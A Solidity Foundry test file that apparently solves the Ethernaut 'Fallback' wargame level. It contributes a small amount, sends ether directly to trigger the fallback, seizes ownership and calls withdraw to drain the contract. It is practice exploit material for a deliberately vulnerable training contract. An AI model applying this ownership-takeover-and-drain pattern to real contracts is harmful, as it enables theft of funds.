// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Fallback} from "../src/Fallback.sol";

contract FallbackTest is Test {
    Fallback fb;
    address owner;
    address attacker;
    function setUp() public {
        fb = new Fallback();

        owner = address(this);
        attacker = address(0x123456); // address(0x1) doesnot work here
        vm.deal(attacker, 1 ether);

    }

    function test_withdraw() public {
        
        vm.startPrank(attacker); // actually msg.sender didnot change

        fb.contribute{value:0.0009 ether}();
        
        assertEq(fb.getContribution(), 0.0009 ether);
        assertEq(fb.owner(), address(this));

        // change owner
        (bool success, ) = address(fb).call{value: 0.0005 ether}("");
        require(success, "Ether transfer failed");

        assertEq(fb.owner(), attacker);

        // steal assert
        fb.withdraw();
        assertEq(address(fb).balance, 0);
        require(attacker.balance > 0);
        console.log(attacker.balance);

        vm.stopPrank();
    }
}